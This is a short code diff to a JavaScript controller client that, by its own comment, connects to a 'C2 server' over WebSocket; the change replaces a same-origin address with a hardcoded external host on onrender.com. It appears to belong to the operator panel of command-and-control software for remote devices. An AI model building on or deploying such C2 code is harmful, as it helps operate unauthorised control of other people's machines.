@@ -3,9 +3,7 @@
  * Connects to C2 server via WebSocket (/ws/controller path)
  */
 
-const C2_HOST = window.location.hostname;
-const C2_PORT = window.location.port || 8080;
-const WS_URL = `wss://${C2_HOST}/ws/controller`;
+const WS_URL = `wss://serv-545b.onrender.com/ws/controller`;
 
 let ws              = null;
 let selectedDevice  = null;
